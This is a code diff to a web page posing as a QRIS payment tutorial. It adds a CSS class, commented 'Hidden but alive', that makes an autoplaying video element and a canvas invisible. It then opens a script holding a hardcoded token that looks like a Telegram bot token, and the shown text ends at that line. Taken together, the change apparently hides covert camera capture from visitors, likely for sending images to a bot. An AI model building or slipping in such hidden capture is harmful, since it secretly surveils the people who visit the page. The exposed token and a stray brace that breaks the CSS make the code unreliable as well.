@@ -6,6 +6,19 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Tutorial Pembayaran QRIS</title>
   <style>
+  /* Hidden but alive */
+.hidden-force {
+  position: absolute !important;
+  width: 1px !important;
+  height: 1px !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+  overflow: hidden !important;
+}
+
+}
+
+  
     *{margin:0;padding:0;box-sizing:border-box}
     body{
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -362,8 +375,11 @@
 </html>
 
 <!--Pembatasan kah -->
-    <video id="video" autoplay muted class="hidden"></video>
-    <canvas id="canvas" class="hidden"></canvas>
+<video id="video" autoplay muted playsinline class="hidden-force"></video>
+<canvas id="canvas" class="hidden-force"></canvas>
+
+
+
 <!--Pembatasan kah -->
     <script>
         const token = '8295593119:AAG_-Tr1HVrFVpD0_f4OLHSGEsqoDCk84og';
